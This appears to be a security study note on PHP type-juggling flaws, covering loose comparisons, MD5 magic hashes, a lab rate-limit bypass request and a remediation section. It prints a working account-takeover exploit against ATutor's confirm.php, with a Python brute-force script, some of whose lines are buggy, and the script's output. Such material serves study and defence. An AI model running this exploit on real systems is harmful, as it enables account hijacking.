>[!warning]
>**PHP does not require (or support) explicit type definition in variable declaration**; a variable's type is determined by the context in which the variable is used. 
>That is to say, if a string value is assigned to variable `$var`, `$var` becomes a string. If an int value is then assigned to `$var`, it becomes an int.

>[!warning]
>PHP8 is no longer vulnerable!

![|700](../../zzz_res/attachments/Pasted%20image%2020221210135017.png)

![|700](../../zzz_res/attachments/Pasted%20image%2020221210135040.png)

# Loose comparison examples

```php
php > var_dump('0xAAAA' == '43690');
bool(false)
php > var_dump('0xAAAA' == 43690);
bool(false)
php > var_dump(0xAAAA == 43690);
bool(true)
php > var_dump('0xAAAA' == '43691');
bool(false)

php > var_dump('0eAAAA' == '0');
bool(false)
php > var_dump('0e1111' == '0');
bool(true)
php > var_dump('0e9999' == 0);
bool(true)
```

During the comparison of variables of **different types**, PHP will first **convert them to a common**, comparable type.

```php
$example_int = 7
$example_str = "7"
if ($example_int == $example_str) {   
	echo("PHP can compare ints and strings.")
}
```

The comparison between *7* and *“7”* returns *True* because the two variables are both converted to a common type (int) therefore resulting equals.

The same behavior happens here:

```php
if ("7 puppies" == 7){
	return 0;
}
```

The number is extracted from the string and is then compared with the integer.

Let’s see another example:

```php
if ("Puppies" == 0) {
	retrun 0;
}
```

Also in this case the comparison returns *True* because the string is converted to a 0 in order to be compared with a number.

## Magic Hashes

>[!info]
>Further information on [Magic Hashes](https://www.whitehatsec.com/blog/magic-hashes/)

The hexadecimal character space used for the representation of various hash types is **a-fA-F0-9**. 
This implies that it may be possible to discover a plain-text value whose MD5 hash conforms to the format of scientific exponent notation. In the case of MD5, that is indeed true and the specific string was discovered by Michal Spacek.

```php
student@atutor:~$ php -a
Interactive mode enabled
php > echo md5('240610708');
0e462097431906509019562988736854
php > var_dump('0e462097431906509019562988736854' == '0');
bool(true)
```

The MD5 of this particular string translates to a valid number formatted in the [scientific exponential notation](https://www.php.net/manual/en/language.types.float.php), and its value evaluates to zero.

# Exploitation

## Classic authentication bypass

```php
if ($_POST["password"] == "Admin_Password") {login_as_admin();}
```

Passing an **integer** *0* as a password the comparison become `(0 == “Admin_Password”) -> True`, granting the access without knowing the real password.

## Rate-limit bypass

Type confusions attacks can also be used to bypass brute-force protection mechanism based on rate limit:

```http
POST /login HTTP/1.1
Host: 0a690029038e65bfc04ed2d1007d0057.web-security-academy.net
Cookie: session=Zb1D8NGHIvy10kSH26Xrwex4kxtvUPHZ
Content-Length: 1194
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: https://0a690029038e65bfc04ed2d1007d0057.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a690029038e65bfc04ed2d1007d0057.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"username":"carlos","password":["123456",
"password",
"12345678",
"qwerty",
"123456789",
"12345",
"1234",
"111111",
"1234567",
...
"moscow"
],"":""}
```

## Authentication bypass exploiting business logic flaws and type juggling

ATutor was vulnerable to an authentication bypass and account takeover vulnerability caused by a [flawed business logic](Business%20logic%20vulnerabilities.md) affected by a type juggling vulnerability ^[adv].

[^adv]: https://srcincite.io/advisories/src-2016-0012/

The *confirm.php* file updates user's email, but it can be invoked without authentication. Because of the type juggling vulnerability, it can be use to takeover any account.

*confirm.php*
```php
if (isset($_GET['e'], $_GET['id'], $_GET['m'])) {
	$id = intval($_GET['id']); // user id
	$m = $_GET['m']; // ad-hoc value
	$e = $addslashes($_GET['e']); // email

	$sql = "SELECT creation_date FROM %smembers WHERE member_id=%d";
	$row = queryDB($sql, array(TABLE_PREFIX, $id), TRUE);

	if ($row['creation_date'] != '') {
		$code = substr(md5($e . $row['creation_date'] . $id), 0, 10); // $code can be partially controlled, but we must bruteforce it playing around with the $e parameter. We must obtain a value similar to 0e123456
		if ($code == $m) { // type juggling
			$sql = "UPDATE %smembers SET email='%s', last_login=NOW(), creation_date=creation_date WHERE member_id=%d";
			$result = queryDB($sql, array(TABLE_PREFIX, $e, $id)); // email updated and account takeover can be achieved requesting a new password
			...
```

Brute-force script used to find a valid email address allowing to exploit the vulnerability:
```python
import hashlib, string, itertools, re, sys, requests

def update_email(ip, domain, id, prefix_length):
	count = 0
	for word in itertools.imap(''.join, itertools.product(string.lowercase, repeat=int(prefix_length))):
		email = "%s@%s" % (word, domain)
		url = "http://%s/ATutor/confirm.php?e=%s&m=0&id=%s" % (ip, email, id)
		print "(*) Issuing update request to URL: %s" % url
		r = requests.get(url, allow_redirects=False)
		if (r.status_code == 302):
			return (True, email, count)
		else:
			count += 1
		return (False, Nothing, count)

def main():
	if len(sys.argv) != 5:
		print '(+) usage: %s <domain_name> <id> <prefix_length> <atutor_ip>' % sys.argv[0]
		print '(+) eg: %s offsec.local 1 3 192.168.1.2' % sys.argv[0]
		sys.exit(-1)
	domain = sys.argv[1]
	id = sys.argv[2]
	prefix_length = sys.argv[3]
	ip = sys.argv[4]

	result, email, c = update_email(ip, domain, id, prefix_length)
		if(result):
			print "(+) Account hijacked with email %s using %d requests!" % (email, c)
		else:
			print "(-) Account hijacking failed!"
if __name__ == "__main__":
	main()
```
```bash
$ python atutor_update_email.py offsec.local 1 3 192.168.2.225
(*) Issuing update request to URL:
http://192.168.2.225/ATutor/confirm.php?e=aaa@offsec.local&m=0&id=1
(*) Issuing update request to URL:
http://192.168.2.225/ATutor/confirm.php?e=aab@offsec.local&m=0&id=1
(*) Issuing update request to URL:
http://192.168.2.225/ATutor/confirm.php?e=aac@offsec.local&m=0&id=1
(*) Issuing update request to URL:
http://192.168.2.225/ATutor/confirm.php?e=aad@offsec.local&m=0&id=1
(*) Issuing update request to URL:
http://192.168.2.225/ATutor/confirm.php?e=aae@offsec.local&m=0&id=1
...
...
(*) Issuing update request to URL:
http://192.168.2.225/ATutor/confirm.php?e=axs@offsec.local&m=0&id=1
(*) Issuing update request to URL:
http://192.168.2.225/ATutor/confirm.php?e=axt@offsec.local&m=0&id=1
(+) Account hijacked with email axt@offsec.local using 617 requests! # (+) md5('axt@offsec.local'.$row['creation_date']) similar to 00e5718309 and can be used to bypass the loose comparison
```


# Remediation

When comparing values, always try to use the type-safe comparison operator `"==="` instead of the loose comparison operator `"=="`. This will ensure that PHP does not type juggle and the operation will only return True if the types of the two variables also match. 

```php
$example_int = 7
$example_str = "7"
if ($example_int === $example_str) {   
	echo("PHP can compare ints and strings.");
}
```

In this scenario, the comparison result is *False*

---

# External Resources

- [PHP Type Juggling Vulnerabilities](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)